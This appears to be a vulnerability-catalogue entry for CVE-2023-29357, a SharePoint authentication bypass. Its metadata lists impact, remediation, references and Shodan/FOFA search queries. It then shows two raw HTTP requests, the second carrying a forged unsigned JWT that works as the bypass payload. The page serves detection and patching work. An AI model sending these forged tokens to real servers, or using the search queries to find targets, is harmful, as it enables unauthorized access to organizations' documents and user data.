---
layout: post
cve_id: CVE-2023-29357
title: Microsoft SharePoint - Authentication Bypass
pcap: true
pcap_path: /pcaps/2023/CVE-2023-29357.pcap
nuclei_url: https://github.com/packetinside/nuclei-templates/blob/main/http/cves/2023/CVE-2023-29357.yaml
snort2_rule: N/A
snort3_rule: N/A
author: pdteam
severity: critical
impact: 'Unauthenticated attackers can bypass authentication by forging JWT tokens
  with "none" algorithm to access SharePoint Server APIs, potentially gaining elevated
  privileges and accessing sensitive documents, user information, and SharePoint site
  configurations.

  '
remediation: 'Apply Microsoft security patches from MSRC update guide CVE-2023-29357
  that properly validates JWT token signatures and prevents authentication bypass
  in SharePoint Server.

  '
reference:
- https://msrc.microsoft.com/update-guide/vulnerability/CVE-2023-29357
- https://srcincite.io/advisories/src-2020-0022/
- https://github.com/Chocapikk/CVE-2023-29357
- https://sec.vnpt.vn/2023/08/phan-tich-cve-2023-29357-microsoft-sharepoint-validatetokenissuer-authentication-bypass-vulnerability/
- https://starlabs.sg/blog/2023/09-sharepoint-pre-auth-rce-chain/
classification:
  cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
  cvss-score: 9.8
  cve-id: CVE-2023-29357
  epss-score: 0.94356
  epss-percentile: 0.99958
  cpe: cpe:2.3:a:microsoft:sharepoint_server:2019:*:*:*:*:*:*:*
metadata:
  verified: true
  max-request: 2
  vendor: microsoft
  product: sharepoint_server
  shodan-query:
  - http.headers_hash:-1968878704
  - cpe:"cpe:2.3:a:microsoft:sharepoint_server"
  fofa-query:
  - app="Microsoft-SharePoint"
  - app="microsoft-sharepoint"
tags:
- cve
- cve2023
- microsoft
- sharepoint_server
- kev
- vkev
- vuln
---

## üîç Vulnerability Description
Microsoft SharePoint Server Elevation of Privilege Vulnerability


## üåê HTTP Request
```nohighlight
GET /_api/web/siteusers HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:140.0) Gecko/20100101 Firefox/140.2
Connection: close
Authorization: Bearer
Accept-Encoding: gzip
```

```nohighlight
GET /_api/web/siteusers HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:140.0) Gecko/20100101 Firefox/140.8
Connection: close
Accept: application/json
Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJhdWQiOiIwMDAwMDAwMy0wMDAwLTBmZjEtY2UwMC0wMDAwMDAwMDAwMDBAek9OTGZqIiwiZW5kcG9pbnR1cmwiOiJxcWxBSm1UeHBCOUE2N3hTeVprK3RtcnJObVlDbFkvZnFpZzdjZVpOc1NNPSIsImVuZHBvaW50dXJsTGVuZ3RoIjoxLCJleHAiOjIwMTE1NDcyMjMsImlzbG9vcGJhY2siOnRydWUsImlzcyI6IjAwMDAwMDAzLTAwMDAtMGZmMS1jZTAwLTAwMDAwMDAwMDAwMCIsIm5hbWVpZCI6IjAwMDAwMDAzLTAwMDAtMGZmMS1jZTAwLTAwMDAwMDAwMDAwMEB6T05MZmoiLCJuYmYiOjE2OTU5ODc3MDMsInZlciI6Imhhc2hlZHByb29mdG9rZW4ifQ.AAA
X-PROOF_TOKEN: eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJhdWQiOiIwMDAwMDAwMy0wMDAwLTBmZjEtY2UwMC0wMDAwMDAwMDAwMDBAek9OTGZqIiwiZW5kcG9pbnR1cmwiOiJxcWxBSm1UeHBCOUE2N3hTeVprK3RtcnJObVlDbFkvZnFpZzdjZVpOc1NNPSIsImVuZHBvaW50dXJsTGVuZ3RoIjoxLCJleHAiOjIwMTE1NDcyMjMsImlzbG9vcGJhY2siOnRydWUsImlzcyI6IjAwMDAwMDAzLTAwMDAtMGZmMS1jZTAwLTAwMDAwMDAwMDAwMCIsIm5hbWVpZCI6IjAwMDAwMDAzLTAwMDAtMGZmMS1jZTAwLTAwMDAwMDAwMDAwMEB6T05MZmoiLCJuYmYiOjE2OTU5ODc3MDMsInZlciI6Imhhc2hlZHByb29mdG9rZW4ifQ.AAA
Accept-Encoding: gzip
```

